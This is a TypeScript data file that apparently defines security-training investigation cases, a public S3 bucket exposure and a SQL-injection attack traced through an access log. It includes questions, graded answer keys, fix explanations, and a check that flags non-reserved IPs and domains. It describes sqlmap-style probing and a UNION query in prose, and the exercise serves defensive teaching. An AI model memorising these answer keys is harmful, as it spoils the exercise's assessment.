      { id: 'q3', prompt: 'Which identity made the bucket public?', format: 'IAM user name', hint: 'userIdentity.userName on the policy change.', answers: ['ci-deployer'], explanation: 'ci-deployer, running Terraform from the CI runner at 10.40.1.9, made both changes. This was most likely a bad infrastructure-as-code change, not an intruder.', points: 10 },
      { id: 'q4', prompt: 'Which part of the bucket policy made it public?', format: 'Pick one', hint: 'Who is the policy allowing?', options: ['"Principal": "*" with s3:GetObject', '"Effect": "Allow" alone', 'The Sid named PublicRead', '"Version": "2012-10-17"'], answers: ['"Principal": "*" with s3:GetObject'], explanation: 'Principal "*" means anyone, including people with no account. Combined with s3:GetObject on every object, any file in the bucket can be downloaded by URL.', points: 15 },
      { id: 'q5', prompt: 'What is the first outside IP address that downloaded the payroll file?', format: 'IPv4 address', hint: 'Look for GetObject from an anonymous identity, earliest first.', answers: ['203.0.113.150'], explanation: '203.0.113.150 downloaded 2026-03/payroll.csv at 03:22:47 with curl, and 198.51.100.200 did again at 05:10. Both count as exposure of payroll data.', points: 10 },
      { id: 'q6', prompt: 'What fixes this properly?', format: 'Pick one', hint: 'Fix both the bucket and the thing that changed it.', options: ['Restore Block Public Access, remove the public policy, and fix the Terraform code and CI permissions', 'Rename the payroll file', 'Delete the CloudTrail logs', 'Only block 203.0.113.150'], answers: ['Restore Block Public Access, remove the public policy, and fix the Terraform code and CI permissions'], explanation: 'Re-enable the guardrail and remove the policy now, then fix the code so the next deploy does not undo it, and limit ci-deployer so it cannot remove public access blocks. Blocking one IP does nothing because the bucket was open to everyone.', points: 15 }
    ],
    debrief: 'A deployment identity changed the bucket to allow anonymous reads, and two outside IPs downloaded payroll data. This is a data breach that likely needs legal and privacy review even though no one "hacked" anything. Fix the bucket, fix the code, restrict the CI role, turn on account-level Block Public Access, and add an alert on DeletePublicAccessBlock and PutBucketPolicy with Principal "*".'
  },
  {
    slug: 'products-page-sqli',
    title: 'Errors on the products page',
    summary: 'The web team sees a burst of 500 errors. Read the access log and work out what happened.',
    story: 'The shop\'s monitoring showed a short burst of server errors on /products.php. The developer says "probably a bot, ignore it". You have the web server access log for those minutes.',
    category: 'Web',
    difficulty: 'intermediate',
    estimatedMinutes: 20,
    skills: ['Access logs', 'SQL injection', 'URL decoding'],
    evidence: [
      { id: 'access', name: 'nginx-access.log', kind: 'log', description: 'Combined log format: IP, time, request, status, bytes, referrer, user agent.', content: accessLog }
    ],
    questions: [
      { id: 'q1', prompt: 'Which IP address is behind the unusual requests?', format: 'IPv4 address', hint: 'Find the requests with odd characters in the id value.', answers: ['198.51.100.66'], explanation: 'Every modified request comes from 198.51.100.66.', points: 10 },
      { id: 'q2', prompt: 'What tool does the user agent name?', format: 'Tool name', hint: 'The last quoted field on each line.', answers: ['sqlmap', 'sqlmap/1.8.2', 'sqlmap/1.8.2#stable'], explanation: 'The user agent is sqlmap, an automated SQL injection tool. Attackers can fake user agents, so treat it as a clue, not proof.', points: 10 },
      { id: 'q3', prompt: 'Which URL parameter is being tested?', format: 'Parameter name', hint: 'What comes after the ? in each request?', answers: ['id'], explanation: 'Only the id parameter of /products.php is being changed.', points: 10 },
      { id: 'q4', prompt: 'How many requests from that IP returned status 500?', format: 'Number', hint: 'Count lines from that IP with 500 in the status field.', answers: ['3'], explanation: 'Three requests (a single quote, a double quote, and ORDER BY 6) caused 500 errors. Errors on a quote character mean user input reaches the SQL query unescaped.', points: 10 },
      { id: 'q5', prompt: 'Why is the 10:04:31 request the most worrying?', format: 'Pick one', hint: 'Compare its size with a normal products page.', options: ['It is a UNION SELECT on the users table that returned ~88 KB instead of ~4 KB', 'It came from a different IP', 'It returned a 500 error', 'It used POST instead of GET'], answers: ['It is a UNION SELECT on the users table that returned ~88 KB instead of ~4 KB'], explanation: 'The decoded request asks for username, password_hash and email from users, and the server answered 200 with 88,412 bytes. That strongly suggests user data was returned.', points: 20 },
      { id: 'q6', prompt: 'What is the right code fix?', format: 'Pick one', hint: 'Fix the cause, not the symptom.', options: ['Use parameterised queries for the id value', 'Hide 500 error pages', 'Block the sqlmap user agent', 'Rename the products.php file'], answers: ['Use parameterised queries for the id value'], explanation: 'Parameterised (prepared) queries keep input as data so it can never change the SQL. Blocking a user agent or hiding errors only slows an attacker down.', points: 10 }
    ],
    debrief: 'This was not "just a bot". The log shows sqlmap confirming an injectable id parameter (errors on quotes, different sizes for AND 1=1 vs AND 1=2), finding the column count, and then a UNION query on the users table that returned a large 200 response. Treat it as a likely breach of user data: fix the query, rotate any secrets in that database, force password resets if hashes were exposed, check database logs, and add a WAF rule as a temporary layer while the fix ships.'
  }
];

const RESERVED_IP = /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|192\.0\.2\.|198\.51\.100\.|203\.0\.113\.)/;
const RESERVED_DOMAIN = /(^|\.)(example|test|invalid|localhost|local)$|(^|\.)example\.(com|net|org)$/i;

/**
 * Finds IPs and domains in case text that are not reserved for documentation or private use.
 * Case evidence must never point at real people's systems.
 */
export function findRealWorldIndicators(item: Pick<InvestigationCase, 'evidence' | 'questions' | 'story'>) {
  const text = [item.story, ...item.evidence.map((evidence) => evidence.content), ...item.questions.flatMap((question) => [question.prompt, ...question.answers, ...(question.options ?? [])])].join('\n');
  const problems = new Set<string>();
  for (const ip of text.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g) ?? []) {
    if (ip.split('.').every((part) => Number(part) <= 255) && !RESERVED_IP.test(ip)) problems.add(ip);
  }
  for (const match of text.matchAll(/(?:https?:\/\/|@)([a-z0-9.-]+\.[a-z]{2,})/gi)) {
    if (!RESERVED_DOMAIN.test(match[1])) problems.add(match[1].toLowerCase());
  }
  return [...problems];
}

export function findInvestigationCase(slug: string) {
  return investigationCases.find((item) => item.slug === slug) ?? null;
}
